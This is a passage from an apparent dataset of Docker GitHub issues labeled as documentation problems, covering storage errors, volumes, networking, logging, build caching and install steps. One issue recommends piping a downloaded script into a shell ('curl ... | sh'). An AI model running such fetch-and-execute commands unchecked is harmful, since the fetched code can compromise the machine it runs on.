commands hang indefinitely.  dmesg fills with things like the following:\n\n```\n[ 3029.535199] device-mapper: thin: 253:2: reached low water mark for data device: sending event.\n[ 3029.589706] device-mapper: thin: 253:2: switching pool to out-of-data-space mode\n[ 3037.584626] vethac84d34: renamed from eth0\n[ 3037.588339] docker0: port 2(vethd9e484d) entered disabled state\n[ 3037.622172] docker0: port 2(vethd9e484d) entered disabled state\n[ 3037.626293] device vethd9e484d left promiscuous mode\n[ 3037.629420] docker0: port 2(vethd9e484d) entered disabled state\n[ 3089.592091] device-mapper: thin: 253:2: switching pool to read-only mode\n[ 3089.598147] Buffer I/O error on dev dm-4, logical block 144077, lost async page write\n[ 3089.603304] Buffer I/O error on dev dm-4, logical block 144078, lost async page write\n[ 3089.608669] Buffer I/O error on dev dm-4, logical block 144079, lost async page write\n[ 3089.614565] Buffer I/O error on dev dm-4, logical block 144080, lost async page write\n[ 3089.620112] Buffer I/O error on dev dm-4, logical block 144081, lost async page write\n[ 3089.624919] Buffer I/O error on dev dm-4, logical block 144082, lost async page write\n[ 3089.633141] Buffer I/O error on dev dm-4, logical block 144083, lost async page write\n[ 3089.638389] Buffer I/O error on dev dm-4, logical block 144084, lost async page write\n[ 3089.645177] Buffer I/O error on dev dm-4, logical block 144085, lost async page write\n[ 3089.650294] Buffer I/O error on dev dm-4, logical block 144086, lost async page write\n[ 3089.664084] XFS (dm-4): metadata I/O error: block 0x2c230 (\"xfs_buf_iodone_callbacks\") error 5 numblks 16\n[ 3089.684777] XFS (dm-5): metadata I/O error: block 0x2c230 (\"xfs_buf_iodone_callbacks\") error 5 numblks 16\n[ 3089.695953] XFS (dm-4): Unmounting Filesystem\n[ 3089.703478] XFS (dm-4): metadata I/O error: block 0x2c230 (\"xfs_buf_iodone_callbacks\") error 5 numblks 16\n[ 3089.710627] XFS (dm-5): metadata I/O error: block 0x2c230 (\"xfs_buf_iodone_callbacks\") error 5 numblks 16\n...\n[ 3150.336222] XFS (dm-6): metadata I/O error: block 0x2c230 (\"xfs_buf_iodone_callbacks\") error 5 numblks 16\n[ 3240.180102] INFO: task docker:3312 blocked for more than 120 seconds.\n[ 3240.184544]       Tainted: G            E   4.1.17-22.30.amzn1.x86_64 #1\n[ 3240.189691] \"echo 0 > /proc/sys/kernel/hung_task_timeout_secs\" disables this message.\n[ 3240.195639] docker          D ffff880037d03d48     0  3312      1 0x00000000\n[ 3240.200654]  ffff880037d03d48 ffff88003e321980 ffff88003745b300 0000000000000246\n[ 3240.206939]  ffff880037d04000 ffff88003d6aabe0 ffff880037e6cdc0 ffff880037e6cde8\n[ 3240.212569]  ffff880037e6cd90 ffff880037d03d68 ffffffff814df3e7 ffff88003d6aabe0\n[ 3240.218299] Call Trace:\n[ 3240.219963]  [<ffffffff814df3e7>] schedule+0x37/0x90\n[ 3240.223179]  [<ffffffffa048fb79>] xfs_ail_push_all_sync+0xa9/0xe0 [xfs]\n[ 3240.227811]  [<ffffffff810aafc0>] ? prepare_to_wait_event+0x110/0x110\n[ 3240.233513]  [<ffffffffa047b2e9>] xfs_unmountfs+0x59/0x170 [xfs]\n[ 3240.239390]  [<ffffffffa047bdab>] ? xfs_mru_cache_destroy+0x6b/0x90 [xfs]\n[ 3240.247251]  [<ffffffffa047dd36>] xfs_fs_put_super+0x36/0x90 [xfs]\n[ 3240.252770]  [<ffffffff811ccb06>] generic_shutdown_super+0x76/0x100\n[ 3240.256723]  [<ffffffff811ccea7>] kill_block_super+0x27/0x70\n[ 3240.260913]  [<ffffffff811cd1b9>] deactivate_locked_super+0x49/0x80\n[ 3240.265629]  [<ffffffff811cd7ae>] deactivate_super+0x4e/0x70\n[ 3240.269797]  [<ffffffff811e9a63>] cleanup_mnt+0x43/0x90\n[ 3240.274904]  [<ffffffff811e9b02>] __cleanup_mnt+0x12/0x20\n[ 3240.279970]  [<ffffffff81085b97>] task_work_run+0xb7/0xf0\n[ 3240.284063]  [<ffffffff81013bb1>] do_notify_resume+0x51/0x80\n[ 3240.288751]  [<ffffffff814e35bc>] int_signal+0x12/0x17\n```\n\nDescribe the results you expected:\nDocker itself would continue to be responsive, but operations that consume space (pulling images, writing inside a container, etc) would fail.  This is the behavior observed when I switch to ext4 instead of xfs.\n"},{"labels":["documentation",null],"text":"PR #17034 Added the capability to specify per volume mount propagation mode. This added the shared/slave/private options to the `--volume` option.\n\nAs was mentioned in https://github.com/docker/docker/pull/17034#issuecomment-164824550, the documentation for this was supposed to be updated in a follow-up PR, but that doesn't seem to have happened.\n\nPlaces where it is missing or completely underwhelming:\n- https://docs.docker.com/engine/reference/run/\n- https://docs.docker.com/engine/reference/commandline/run/\n- https://docs.docker.com/engine/userguide/containers/dockervolumes/\n\nJust Ctrl+F for the word \"slave\" on those pages, and see that it is missing, or has no explanation.\n\nThis was originally brought up in #20555.\n\ncc @thaJeztah\n"},{"labels":["documentation",null],"text":"The documentation https://docs.docker.com/engine/reference/builder/#impact-on-build-caching explains that build-args only invalidate the cache for the first step in the Dockerfile that _uses_ the build-arg.\n\nGiven that build-args are prepended to each `RUN` instruction, the cache is actually invalidated for each `RUN` instruction (the build-cache does not evaluate `RUN` commands to check if a build-arg is actually _used_).\n\nThe documentation should explain this more clearly.\n\nI haven't checked yet if the build-cache actually evaluates `ENV` instructions to determine if the cache should be used or not, so this has to be checked before updating the documentation as well.\n\nFor more information/example/background, see https://github.com/docker/docker/issues/20136#issuecomment-187688636\n"},{"labels":["documentation",null],"text":"Description of problem:\nMy docker version is 1.9.1. I use the RemoteAPI(https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.21.md) to have some tests. And I found that the docs is incomplete. For example, 'GET /containers/(id)/json' but 'GET /containers/(name)/json' is right too. Maybe we should complete this.\n@thaJeztah @moxiegirl \n"},{"labels":["documentation",null],"text":"Hi,\n\nI saw that docker 1.10 introduced new volumn mount options as \"[[r]shared|[r]slave|[r]private]\", what does   [r] means here?\n\nAlso does there are any detailed explain for the meaning of each type? share, slave and private? \n\nThanks!\n"},{"labels":["documentation",null],"text":"The documentation for docker volumes (found here: https://docs.docker.com/engine/userguide/containers/dockervolumes/) is woefully out of date.\n\nSince docker 1.9 includes top-level `volume` subcommands, and support for volume plugins, this documentation should be updated to reflect these new features.\nIt should also de-emphasize data-only containers as these are no longer considered a recommended pattern.\n"},{"labels":["documentation",null],"text":"As a follow up of #17513, we should complete the network options table:\n\nhttps://github.com/aidanhs/docker/blob/d736a9d2c3758fcc4eac0b62e9c7b128388021c1/docs/reference/commandline/network_create.md#bridge-driver-options\n\n/cc @aidanhs \n"},{"labels":["documentation",null,null],"text":"This official documentation on dockerizing a Node.js app is so misleading, and should highlight not for production.\n\n<blockquote class=\"twitter-tweet\" data-partner=\"tweetdeck\"><p lang=\"en\" dir=\"ltr\">This official documentation on dockerizing a Node.js app is so misleading, and should highlight not for production.<a href=\"https://t.co/ieb0qkIxLK\">https://t.co/ieb0qkIxLK</a></p>&mdash; Manoj Mahalingam (@manojlds) <a href=\"https://twitter.com/manojlds/status/699666115849400320\">February 16, 2016</a></blockquote>\n\n<script async src=\"//platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n"},{"labels":["documentation"],"text":"The current page for https://docs.docker.com/v1.10/engine/userguide/ is blank. It looks like the information that used to be there, such the information found in https://docs.docker.com/v1.8/userguide/ is now located at https://docs.docker.com/engine/userguide/intro/ but the only part of the docs that uses that link is the sidebar. The rest of the links still use either 'userguide/' or 'userguide/index'. I'm having difficulty finding the sidebar code but it seems like an easy fix to move the `userguide/intro.md` to `userguide/index.md` and then point the userguide introduction link found in the sidebar to that end point or change all the links from other documents to point to the intro. Not sure which way it should go but I can make PR if need be.\n"},{"labels":["documentation",null],"text":"Quoting the doc:\n\n> A plugin is a process running **on the same docker host** as the docker daemon, which registers itself by placing a file in one of the plugin directories described in Plugin discovery.\n\nThis is not entirely true because I can have a plugin listening on a domain/ip which can be located outside the daemon host (using the spec or json file).\n\nAlso, systemd socket activation isn't mentioned anywhere in the docs.\n"},{"labels":["documentation",null],"text":"I have an ELK cluster, configured to accept logs over a GELF socket, reachable on `$GELFADDR:$GELFPORT`.\n\nIf I send simple container logs to it, all is fine:\n\n```\ndocker run --log-driver gelf --log-opt gelf-address=udp://$GELFADDR:$GELFPORT \\\n  alpine echo hello world\n```\n\n→ The `hello world` log line shows up in Kibana. _Alles gut._\n\nIf I annotate the logs with a simple label, it still works:\n\n```\ndocker run --log-driver gelf --log-opt gelf-address=udp://$GELFADDR:$GELFPORT \\\n  --log-opt labels=mylabel -l mylabel=myvalue \\\n  alpine echo hello world\n```\n\n→ The log line (with the `mylabel=myvalue` custom field) shows up in Kibana.\n\nHowever, if I put a dot in the label name:\n\n```\ndocker run --log-driver gelf --log-opt gelf-address=udp://$GELFADDR:$GELFPORT \\\n  --log-opt labels=my.label -l my.label=myvalue \\\n  alpine echo hello world\n```\n\n→ The logstash logs show an error, because `.` is forbidden in field names.\n\nThis wouldn't be a big deal, if we weren't advocating the use of dotted labels (e.g. `com.docker.compose.project`).\n\nThere are multiple workarounds:\n- install the `de_dot` filter in logstash (but it doesn't ship by default; so it adds extra hoops compared to just using the stock logstash image from the registry)\n- add a custom Ruby filter to mangle the field names (super hackish, but works without authoring new images, just adding a few lines to the logstash config:\n\n```\nfilter {\n  ruby {\n    code => \"\n      event.to_hash.keys.each { |k| event[ k.gsub('.','_') ] = event.remove(k) if k.include?'.' }\n     \"\n  }\n}\n```\n\n(For the curious: see this [longer thread](https://discuss.elastic.co/t/field-name-cannot-contain/33251/12) about the issue with ElasticSearch))\n\nAt the very least, we should document that in the [logging section](https://docs.docker.com/engine/admin/logging/overview/).\n\nIf you want help to reproduce this behavior, I can provide Compose files to stage up an ELK cluster in a snap.\n\n/cc @moxiegirl \n"},{"labels":["documentation",null,null],"text":"I found some comments on an EMC blog that could point us to a doc error.\n\nhttp://blog.emccode.com/2016/02/04/what-you-need-to-know-about-storage-in-docker-1-10/#comments\n\n![image](https://cloud.githubusercontent.com/assets/1347209/12894929/b144dfc6-ce4e-11e5-8b70-ac9175a13380.png)\n\nhttps://docs.docker.com/engine/userguide/containers/dockervolumes/\n"},{"labels":["documentation",null],"text":"Hey,\n\nbecause I wasn’t very happy with the existing Docker API Client implementations in PHP, I’ve written a new one.\nYou can find the project here: https://github.com/jarkt/docker-php-client\n\nIt would be great, if you link the project here: https://docs.docker.com/engine/reference/api/remote_api_client_libraries/\n"},{"labels":["documentation"],"text":"I'm having issues getting the new `--volume /mnt/shared:/shared:shared` feature of 1.10 working (from #17034). \n\n``` bash\nroot@testhost:~# uname -a\nLinux testhost 3.18.5-031805-generic #201501292218 SMP Fri Jan 30 03:19:17 UTC 2015 x86_64 GNU/Linux\n\nroot@testhost:~# docker info\nContainers: 1\n Running: 0\n Paused: 0\n Stopped: 1\nImages: 9\nServer Version: 1.10.0-dev\nStorage Driver: overlay\n Backing Filesystem: extfs\nExecution Driver: native-0.2\nLogging Driver: json-file\nPlugins:\n Volume: local\n Network: host bridge null\nKernel Version: 3.18.5-031805-generic\nOperating System: Debian GNU/Linux 8 (jessie)\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 1.899 GiB\nName: loxflix\nID: RNAT:QYNF:66KE:DSN5:NRPC:ITAA:6G3M:WMR2:JABB:CPGO:ZN7O:FAVU\nDebug mode (server): true\n File Descriptors: 13\n Goroutines: 31\n System Time: 2016-01-24T08:45:00.139001319Z\n EventsListeners: 0\n Init SHA1: b84242d186971c8111d1f9de77b7c476bc049614\n Init Path: /usr/lib/docker/dockerinit\n Docker Root Dir: /var/lib/docker\nLabels:\n provider=generic\nExperimental: true\n\nroot@testhost:~# findmnt -o TARGET,PROPAGATION /mnt/testhost\nTARGET       PROPAGATION\n/mnt/shared shared\n\nroot@testhost:~# docker run --rm -it --volume /mnt/shared:/data:shared ubuntu:14.04\ndocker: Error response from daemon: Cannot start container 6859ea4fc2f23130da7e72f301c9a82528c6e78e406b6f68261d000410ad6960: Path /mnt/shared is mounted on /mnt/shared but it is not a shared mount..\n```\n\nI had this working under ubuntu. One of the key differences I noted was that `mount` indicated that the mount `/shared` had `-o bind` where as under debian, it doesn't seem to. \n"},{"labels":["documentation",null],"text":"I'm testing an overlay network in docker 1.10.0-rc1 that was not working in 1.9.1 (I'm running kernel 13.3)\n\nI run the following:\n\n```\ndocker network create --driver overlay es-bridge\n```\n\nI confirm the creation of the network:\n\n```\ndocker network ls\nNETWORK ID          NAME                DRIVER\ndf89455cbc24        bridge              bridge\n94df4ba9ba03        none                null\n1c4b0953f828        host                host\n4f0069ac54d2        es-bridge           overlay\n```\n\nThen add a busybox container to it:\n\n```\ndocker run -itd --net=es-bridge busybox\n3ab7ba1969c4084c9d0f0ed23525b05573405a21188fac67f890d6bdcc506807\ndocker: Error response from daemon: subnet sandbox join failed for \"10.0.0.0/24\": overlay subnet 10.0.0.0/24 has conflicts in the host while running in host mode.\n```\n\nThere are no other containers running on this node, and I've run the same container on several nodes and get the same result\n\n```\ndocker version\nClient:\n Version:      1.10.0-rc1\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   677c593\n Built:        Fri Jan 15 18:17:17 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.10.0-rc1\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   677c593\n Built:        Fri Jan 15 18:17:17 2016\n OS/Arch:      linux/amd64\n```\n\n```\ndocker info\nContainers: 3\n Running: 0\n Paused: 0\n Stopped: 3\nImages: 88\nServer Version: 1.10.0-rc1\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 104\n Dirperm1 Supported: false\nExecution Driver: native-0.2\nLogging Driver: json-file\nPlugins:\n Volume: local\n Network: overlay bridge null host\nKernel Version: 3.13.0-32-generic\nOperating System: Ubuntu 14.04.3 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 31.41 GiB\nName: c2b1s2.tera4.terascope.io\nID: EP32:TWMN:LIX6:5B2E:X3AR:FJAH:OVSG:PMVF:XQVQ:FUQ2:6NKF:HNH6\nWARNING: No swap limit support\nCluster store: zk://zk.host:2181\nCluster advertise: IP:2376\n```\n"},{"labels":["documentation"],"text":"I've wasted half a day because after I've created Vagrant-based Docker cluster + overlay networks, then a container could not ping another container even if /etc/hosts was updated properly when a container has joined or left a network. No Docker overlay networking doc or tutorial mentions the requirement that the Docker daemons that join the cluster are identified by the hostname they run on, and if a name clashes, then cross-host container communication is broken.\n"},{"labels":["documentation",null],"text":"Useful to read on a kindle or ipad on the daily commute.\n"},{"labels":["documentation",null],"text":"I used `apt-get install docker.io` and I ended up with version 1.6, though 1.9 is the latest.  So I had a look at https://docs.docker.com/engine/installation/ubuntulinux/ and my face melted, so I googled a bit harder and found that all I actually need run is this:\n\n```\ncurl -fsSL https://get.docker.com/ | sh\n```\n\n(edit: changed `wget` to `curl` because we use `curl` in all places now)\n"},{"labels":["documentation",null],"text":"Link at https://docs.docker.com/engine/extend/plugins/ to pachyderme volume plugin  link to 404 Not Found.\n"},{"labels":["documentation",null,null],"text":"Now that libnetwork uses DNS-based discovery, we should update the docs, and remove references to `/etc/hosts` being updated, see https://github.com/docker/docker/pull/19198#issuecomment-170384315\n\n/cc @sanimej \n"},{"labels":["documentation"],"text":"In the documentation we mention that AuthConfig objects are passed in the X-Registry-Auth header, but we never document the format of AuthConfig objects, or when/why they get passed.\n\nIf you've done a docker login, you'll get a base64 encoded json file which looks like:\n\n{\"username\":\"pdevine\",\"password\":\"mysecretpassword\",\"auth\":\"\",\"email\":\"pdevine@foo.com\",\"serveraddress\":\"192.168.1.101\"}\n\nIf you then do a docker logout, you'll get:\n\n{\"auth\":\"\",\"email\":\"\"}\n\nIf you're using passed tokens, you'll get something like:\n\n{\"registrytoken\": \"foo\"}\n\nWe should document:\n- each of the fields (I think the auth field is new and related to the recent authZ changes?)\n- when fields get omitted (not sure why we even pass anything back after a docker logout?)\n"},{"labels":["documentation",null],"text":"In this guide\nhttps://github.com/docker/docker/blob/master/docs/userguide/dockervolumes.md\n\nIt still refers \n\n```\nNote: Docker will not warn you when removing a container without providing the -v option to delete its volumes. If you remove containers without using the -v option, you may end up with \"dangling\" volumes; volumes that are no longer referenced by a container. Dangling volumes are difficult to get rid of and can take up a large amount of disk space. We're working on improving volume management and you can check progress on this in pull request #14214\n```\n\nBut the pull request was closed,  so either a new issue be linked with or remove that link\n"},{"labels":["documentation"],"text":"Hi,\n\nIn the apt installation instruction for Debian, seen here\nhttps://github.com/docker/docker/blob/master/docs/installation/debian.md#update-your-apt-repository\nyou should add a new point (e.g. after 3.) stating:\n\nInstall package `apt-transport-https` which is needed for https repository URIs.\n\n``` bash\napt-get install apt-transport-https\n```\n"},{"labels":["documentation",null],"text":"In many cases, the man pages are not \"self contained\" in that they don't contain the full documentation for a command.  All the information is only available on docs.docker.com. (Moved from #19034)\n\nFixing this problem should be part of a generation task.  \n"},{"labels":["documentation"],"text":"Markdown is OK: `Usage: docker import file|URL|- [REPOSITORY[:TAG]]`\n\nGenerated manpage is confusingly wrong:\n\n```\ndocker    import [-c|--change[=[]]] [-m|--message[=MESSAGE]] [--help]\nfile|URL|-[REPOSITORY[:TAG]]\n```\n\nbecause it misses the space between `file|URL|-` and `[REPOSITORY[:TAG]]`.\n\nOn a normal project I'd try to debug this, but the docker docs build is a bit mysterious to me, sorry.\n"},{"labels":["documentation",null],"text":"The current documentation and man pages are unclear about;\n- what a \"named\" volume is\n- differences between docker and docker-compose w.r.t. bind-mounted volumes (compose accepts paths relative to the docker-compose.yml, but docker only accepts absolute paths).\n- ~~man pages are not \"self contained\", I.e., in many cases, the full documentation is only available on docs.docker.com~~ (moving this to #19088 )\n\nAs reported on Twitter; https://twitter.com/mt_inside/status/683403251232944128\n"},{"labels":["documentation",null,null],"text":"Description of problem: adding a systemd config file to /etc/systemd/system/docker.service.d as documented in [Control and configure Docker with systemd](https://docs.docker.com/engine/articles/systemd) doesn't have the desired effect on storage driver used due to a missing =\n\n`docker version`: \n\n```\nClient:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5\n Built:        Fri Nov 20 13:20:08 UTC 2015\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5\n Built:        Fri Nov 20 13:20:08 UTC 2015\n OS/Arch:      linux/amd64\n```\n\n`docker info`:\n\n```\nContainers: 0\nImages: 0\nServer Version: 1.9.1\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 0\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.2.0-16-generic\nOperating System: Ubuntu 15.10\nCPUs: 1\nTotal Memory: 3.843 GiB\nName: wily\nID: TMDH:I3EU:4QJW:QWOK:D6UV:MHTA:ZETE:THHF:5JAE:MVMW:LN7Q:X6DI\nWARNING: No swap limit support\n```\n\n`uname -a`:\n\n`Linux wily 4.2.0-16-generic #19-Ubuntu SMP Thu Oct 8 15:35:06 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux`\n\nEnvironment details (AWS, VirtualBox, physical, etc.):\n\nVMware Workstation 11 VM running Ubuntu 15.10 Server\n\nHow reproducible:\n\nConsistently reproducible\n\nSteps to Reproduce:\n\nTry to configure as documented:\n\n```\nsudo mkdir /etc/systemd/system/docker.service.d`\nsudo bash -c 'cat <<EOF > /etc/systemd/system/docker.service.d/overlay.conf\n[Service]\nExecStart=\nExecStart=/usr/bin/docker daemon -H fd:// --storage-driver overlay\nEOF'\nsudo systemctl daemon-reload\nsudo systemctl restart docker\nsudo docker info\n```\n\nAdd in the required = at the end of --storage-driver as documented in [daemon options](https://docs.docker.com/engine/reference/commandline/daemon/):\n\n```\nsudo mkdir /etc/systemd/system/docker.service.d`\nsudo bash -c 'cat <<EOF > /etc/systemd/system/docker.service.d/overlay.conf\n[Service]\nExecStart=\nExecStart=/usr/bin/docker daemon -H fd:// --storage-driver overlay\nEOF'\nsudo systemctl daemon-reload\nsudo systemctl restart docker\nsudo docker info\n```\n\nActual Results:\n\n`--storage-driver overlay` at the end of ExecStart means that aufs gets used\n\nExpected Results:\n\noverlay should be used\n\nAdditional info:\n\n`--storage-driver=overlay` at the end of ExecStart will correctly use overlay\n`--storage-driver btrfs` is perhaps a bad example anyway when the Docker team has been encouraging use of overlay since March.\n"},{"labels":["documentation",null,null],"text":"``` bash\n❯ docker pull gliderlabs/alpine\nUsing default tag: latest\nCannot connect to the Docker daemon. Is the docker daemon running on this host?\n```\n\nIt would be nice to \n- have the docker cli check for the existence of  `boot2docker`, \n  - **true**: attempt to run `boot2docker up` automatically \n  - **false**: a link to this error in a Docker FAQ (can't seem to find one [here](https://docs.docker.com/engine/misc/faq/), surprisingly)\n"},{"labels":["documentation",null],"text":"In https://docs.docker.com/v1.8/userguide/dockervolumes/\n\nit had\n\n docker run --volumes-from dbdata -v $(pwd):/backup ubuntu tar cvf /backup/backup.tar /dbdata\n\nThis tar would keep dbdata directory and its content.\n\nSo in following \n\ndocker run --volumes-from dbdata2 -v $(pwd):/backup ubuntu cd /dbdata && tar xvf /backup/backup.tar\n\nIt would wrong get /dbdata/dbdata/**\nos it is not restore and backup ways.\n\nIt should be changed as \n\ndocker run --volumes-from dbdata2 -v $(pwd):/backup ubuntu tar xvf /backup/backup.tar\n"},{"labels":["documentation",null,null],"text":"Currently `docker top CONTAINER [ps OPTIONS]` is a sort of proxy to the linux command `ps` but with the ability to lookup containers on remote daemons.\nIt has also _a lot_ of gotchas which are currently undocumented.\n\nFirstly, it's totally undocumented that the default `docker top` command w/o arguments will use the UNIX style ps arguments `-ef`.\nIssues come when people start to use the `[ps OPTIONS]` arguments. I understand you should know how ps arguments work before attempting to use them with Docker but it's undocumented that, for instance, as soon as you provide an option, the default `-ef` is _correctly_ dropped (cause ppl may want to use BSD style arguments).\n\nA clear example of people running into troubles is:\n\n``` sh\n$ docker run -d fedora /usr/bin/vi\n2f6f2c1d9a22e820c4b54e8e6baf7f1a40fc43c5e6efae5bdf45987e59d74f6f\n\n$ docker run -ti --rm fedora /bin/bash\n[root@be3f718de20d /]#\n\n$ docker ps\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\nbe3f718de20d        fedora              \"/bin/bash\"         15 seconds ago      Up 15 seconds                           elegant_jepsen\n2f6f2c1d9a22        fedora              \"/usr/bin/vi\"       40 seconds ago      Up 40 seconds                           insane_einstein\n```\n\nNow people will run `docker top` for the above 2 containers (which shells out to `ps -ef` and then filters out to the containers' pid):\n\n``` sh\n$ docker top be3f718de20d\nUID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD\nroot                21138               1400                0                   16:59               pts/2               00:00:00            /bin/bash\n\n$ docker top 2f6f2c1d9a22\nUID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD\nroot                21072               1400                0                   16:58               ?                   00:00:00            /usr/bin/vi\n```\n\nSo far so good. While sometihng like the following is pretty the same (given the daemon runs on the same machine as the client):\n\n``` sh\n$ ps -ef | grep $(docker inspect --format '{{ .State.Pid }}' be3f718de20d)\nroot     21138  1400  0 16:59 pts/2    00:00:00 /bin/bash\n```\n\nReal issues starts when those users start to play with `docker top` to select fields for instance. Let's say they're just interested in getting `pid,cmd` of the above two containers. Let's run `docker top` (as users might do w/o any documentation or deep knowledge of the difference between ps UNIX and BSD arguments):\n\n``` sh\n$ docker top be3f718de20d -o pid,cmd\nPID                 CMD\n\n$ docker top 2f6f2c1d9a22 -o pid,cmd\nPID                 CMD\n21072               /usr/bin/vi\n```\n\nTheir first WTF is why the first command doesn't show any output. So they play again, this time dropping the dash in `-o`:\n\n``` sh\n$ docker top be3f718de20d o pid,cmd \nPID                 CMD\n21138               /bin/bash\n\n$ docker top 2f6f2c1d9a22 o pid,cmd\nPID                 CMD\n```\n\nThis time they get the inverted output. Because running with BSD flags doesn't show processes w/o a TTY while the first one is inverted because the opposite, kind of, applies.\nWhat they really wanted to do to list both was:\n\n``` sh\n# BSD style\n$ docker top be3f718de20d axo pid,cmd\nPID                 CMD\n21138               /bin/bash\n$ docker top 2f6f2c1d9a22 axo pid,cmd\nPID                 CMD\n21072               /usr/bin/vi\n\n# UNIX style\n$ docker top be3f718de20d -eo pid,cmd\nPID                 CMD\n21138               /bin/bash\n$ docker top 2f6f2c1d9a22 -eo pid,cmd\nPID                 CMD\n21072               /usr/bin/vi\n```\n\nWhat I'm proposing is to better document all this gotchas and pitfalls (cause right now there's lack for this).\nI've already actually summarized an explanation of the above issue in this bugzilla also https://bugzilla.redhat.com/show_bug.cgi?id=1293063#c1 (I'm planning to sumbit a PR to resolve this but there would be need for other examples as well)\n"},{"labels":["documentation",null],"text":"prerequisites:\n\n```\n$ mkdir -p test/foo\n$ touch test/foo/{run,dev}\n$ cd test\n```\n\nhere I know `COPY` is documented to not be allowed in builds from `STDIN` (https://docs.docker.com/engine/reference/builder/#copy), yet I can build and get the error for `COPY` which requires two arguments not that `COPY` isn't allowed from `STDIN`\n\n```\n$ docker build -t test1 - <<EOF\nheredoc> FROM busybox\nheredoc> COPY ./foo/ $NO_SUCH\nheredoc> RUN /bin/true\nheredoc> EOF\nSending build context to Docker daemon 2.048 kB\nStep 1 : FROM busybox\n ---> d9551b4026f0\nStep 2 : COPY ./foo/\nCOPY requires at least two arguments\n```\n\nThe above should be because my shell expands `$NO_SUCH` and I get the error.\nif I double quote `EOF`:\n\n```\n$ docker build -t test2 - <<\"EOF\"\nFROM busybox\nCOPY ./foo/ $NO_SUCH\nRUN /bin/true\nEOF\nSending build context to Docker daemon 2.048 kB\nStep 1 : FROM busybox\n ---> d9551b4026f0\nStep 2 : COPY ./foo/ $NO_SUCH\nlstat foo/: no such file or directory\n```\n\nNow with Dockerfile(s):\n\n```\n$ cat > Dockerfile <<\"EOF\"\nFROM busybox\nCOPY ./foo/ $NO_SUCH_THING\nRUN /bin/true\nEOF\n\n# I'm using \"EOF\" to not escape the env\n\n$ docker build -t test3 .\nSending build context to Docker daemon 4.608 kB\nStep 1 : FROM busybox\n ---> d9551b4026f0\nStep 2 : COPY ./foo/ $NO_SUCH_THING\n ---> 72b33ade0818\nRemoving intermediate container 2844bb1cab7c\nStep 3 : RUN /bin/true\n ---> Running in 9907a0595847\n ---> 0f489092922f\nRemoving intermediate container 9907a0595847\nSuccessfully built 0f489092922f\n```\n\nEverything goes well and the resulting image has a `run` file in the `/`\n\nSo, it isn't documented anywhere that in `COPY <src> <dest>`, if `<dest>` is an empty string (`COPY ./foo/ \"\"` is legal) it will copy `<src>` to the root directory.\nThe build from a Dockerfile isn't failing with the error of at least two arguments because when evaluating an env, if no ENV are declared at all (either with `-e`) the `ProcessWord` return the empty https://github.com/docker/docker/blob/master/builder/dockerfile/shell_parser.go#L313 string and everything is now legal  because args is a slice with a string and an empty string. But it's undocumented.\n\nShould we document this behavior? Should we error out when `<dest>` is an empty string (I don't think so)? Didn't tested `ADD` like `COPY` but I think most of this applies as well.\n\n@duglin WDYT?\n"},{"labels":["documentation"],"text":"in the example: https://docs.docker.com/opensource/project/set-up-dev-env/\n\nwhenever follow this:\n\nThis host has no images. You may have one or more dangling images. A dangling image is not used by a running container and is not an ancestor of another image on your system. A fast way to remove dangling containers is the following:\n\n$ docker rmi -f $(docker images -q -a -f dangling=true)\n\nsometimes, the env not have dangling images, so it would complain like below:\n\n$ docker rmi -f $(docker images -q -a -f dangling=true)\ndocker: \"rmi\" requires a minimum of 1 argument.\nSee 'docker rmi --help'.\n\nUsage:  docker rmi [OPTIONS] IMAGE [IMAGE...]\n\nI propose we improve like this:\n\n$ dangling_images=`docker images -q -a -f dangling=true`; [ -n \"$dangling_images\" ] &&  docker rmi -f ${dangling_images}\n"},{"labels":["documentation",null,null],"text":"Description of problem:\n\nThe [Installation on on Mac OS X](https://docs.docker.com/engine/installation/mac/) tutorial instructs users to mount a local folder as a container volume for nginx to serve.\n\n```\n$ docker run -d -P -v $HOME/site:/usr/share/nginx/html --name mysite nginx\n$ echo \"my new site\" > index.html\n$ echo \"This is cool\" > cool.html\netc.\n```\n\nThis works, but if you're a little red riding hood such as myself, you may let the whale-wolf trick you into venturing into the forrest to pick some flowers for your grandmother, or in my case overwrite one of the files with new data. This will drive you into the arms of a [5 years old vboxfs sendfile bug](https://www.virtualbox.org/ticket/9069), causing updates to the file to show only partially, or not at all, when served via nginx. And we all know how that story ends :smile: .\n\n`docker version`:\nClient:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.3\n Git commit:   a34a1d5\n Built:        Fri Nov 20 17:56:04 UTC 2015\n OS/Arch:      darwin/amd64\n\nServer:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.3\n Git commit:   a34a1d5\n Built:        Fri Nov 20 17:56:04 UTC 2015\n OS/Arch:      linux/amd64\n`docker info`:\nContainers: 12\nImages: 65\nServer Version: 1.9.1\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 89\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.1.13-boot2docker\nOperating System: Boot2Docker 1.9.1 (TCL 6.4.1); master : cef800b - Fri Nov 20 19:33:59 UTC 2015\nCPUs: 1\nTotal Memory: 1.956 GiB\nName: default\nID: P2Y6:MOYK:HJRI:XNP2:LAZ5:JB4C:CLHS:I56K:BEVH:WTTK:ZY3G:IGPY\nDebug mode (server): true\n File Descriptors: 20\n Goroutines: 35\n System Time: 2015-12-15T13:16:40.814333675Z\n EventsListeners: 0\n Init SHA1: \n Init Path: 